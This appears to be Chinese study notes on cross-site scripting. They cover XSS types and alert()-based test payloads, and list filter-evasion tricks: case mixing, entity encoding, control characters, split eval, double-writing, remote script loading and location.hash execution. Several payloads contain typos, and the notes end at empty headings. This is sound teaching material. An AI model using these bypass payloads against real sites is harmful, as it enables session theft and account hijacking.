#### xss  漏洞

​	微博、留言板、聊天室等收集用户输入的地方，都有可能被注入xss 代码，都存在遭受xss的风险。

#### xss的危害

* 盗取各种用户账号。
* 窃取用户Cookie资料，冒充用户身份进入网站。
* 劫持用户会话，执行任意操作。
* 刷流量，执行弹窗广告。
* 传播蠕虫病毒，等等

#### xss 漏洞的验证

​	我们可以用一段简单的代码，验证和检测漏洞的存在。

**常用命令：** 

~~~js
<script>alert(/xss/)</script>	# 常用	弹窗操作
<script>confirm('xss')</script>
<script>prompt('xss')</script>
~~~

#### XSS 的分类

​	xss 漏洞大概可以分为三大类：反射型xss、存储型xss、DOM型xss

##### 反射型XSS

​	反射型XSS 是非持久性、参数型的跨站脚本。在web代码中应用的参数（变量）中。

在搜索框中，提交`<script>alert(/xss/)</script>`，点击搜索，即可触发反射型xss。

##### **存储型XSS**

​	存储型xss 是持久型跨站脚本，持久性体现在xss，代码不是在参数（变量）中，而是写进数据库或文件

##### **DOM XSS** 

​	DOM XSS 比较特殊。通过修改网页的DOM数，浏览器重新渲染页面。源代码没改变。 

#### XSS 的构造

**利用`<>`构造 HTML 标签和`<script>` 标签。**

&ensp; 在测试页面提交参数`<h1 style=color:red> ` 一类代码。

**伪协议** 

&ensp; 使用 `javascript` 伪协议的方法构造 XSS

例1、：`<a href="javascript:alert(/xss/)">touch sta</a>` 然后点击超链接，即可触发 XSS

例2、`<img src="javascript:alert('xss')">` 使用 img 标签的伪协议（新版浏览器不支持）

**产生自己的事件** 

&ensp; **事件驱动：** 是一种比较经典的编程思想。（比如鼠标移动，键盘输入等），JS 可以对这些事件进行响应。所以我们可以通过事件触发JS函数，触发XSS

例1：`<img src='./sat.jpg' onmouseover="alert(/xss/)">` 这个标签会引入一张图片，当鼠标悬停在图片上的时候，会触发XSS代码。

例2：单行文本框的键盘点击事件，`<input type="text" onkeydown="alert(/XSS/)">`,当点击键盘任意按键，就会触发XSS代码。

#### XSS 的变形

我们可以构造的 XSS 代码进行各种变形，来绕过 XSS 过滤器的检测。



* **大小写转换**

可以将payload进行大小写转化。

**例如：**

~~~html
<Img sRc='#' Onerror="alert(/XSS/)">
<a hREf="javaScript:alert(/XSS/)"> hello </a>
~~~



* **引号的使用**

HTML 语言中对引号的使用不敏感，可以通过引号绕过过滤器。

**例如：**

~~~html
<img src="#" onmouseover="alert(/XSS/)">
<img src='#' onmouseover='alert(/XSS/)'>
<img src=# onmouseover=alert(/XSS/)>
~~~



* **用 / 代替空格 **

可以使用左斜线代替空格。

**例如：**

~~~html
<img/scr='#'/onmouseover='alert(/XSS/)'>
~~~



* **回车**

我们可以在一些位置添加 Tab （水平制表符）和回车符，绕过关键字检测。

~~~html
<Img/sRc='#'/onmouseover	='alert(/XSS/)'>
<img/scr='#'/onmouseover='alert(/XSS/)'>
<img/scr="#"/onclick='alert(/XSS)'>
~~~



* **对标签属性值进行转码。** 

可以对标签属性值进行转码，绕过过滤。

| 字母 | ASCII码 | 十进制编码 | 十六进制编码 |
| ---- | ------- | ---------- | ------------ |
| a    | 97      | &#97       | &#x61        |
| e    | 101     | &#101      | &#x65        |

~~~html
<A href="j&#97;v&#x61;script:alert(/XSS/)"> hello PHP </a>
~~~



* 可以将以下字符插入到头部位置。

| Tab  | 换行 | 回车 |
| ---- | ---- | ---- |
| &#9  | &#10 | &#13 |



* 可以将一下字符插入到头部位置

| SOH  | STX  |
| ---- | ---- |
| &#01 | &#02 |

~~~html
<A hREF="&#01;j&#97;v&#97;s&#x65;c&#10;r&#13;ipt:alert(/XSS/)"> hello PHP </a>
~~~



* 拆分跨站

~~~html
<script>z='alert'</script>		# 定义变量
<script>d=z+'(/XSS/)'</script>		# 将变量进行拼接
<script>eval(d)</script>
~~~



* 双写绕过

~~~html
<scr<script>ipt></script>
~~~



#### CSS 变形



#### Shellcode 的调用

&ensp; Shellcode 就是在利用漏洞所执行的代码。



###### 远程调用JS

&ensp; 可以将JS代码单独放在一个JS文件中，然后通过http 协议远程加载该脚本。

~~~html
<script scr="http://192.168.123.123/XSS/text/demo.js"></script>
~~~

代码内容：`alert('XSS');`



**windows.location.hash**

&ensp; 我们可以使用JS中windows.location.hash 方法获取浏览器URL地址栏的XSS代码。

&ensp; windows.location.hash 会获取URL中 # 后面的内容，例如`http://127.0.0.1/123.php#hello` windows.location.hash的值就是 hello

构造代码绕过过滤`?submit=submit&xsscode=<script>eval(location.hash.substr(1))</script>#alert(/XSS/)` 

###### XSS Downloader

&ensp; XSS 下载器就是 XSS 代码写到网页中，然后通过AJAX技术，取得页面的XSS代码。























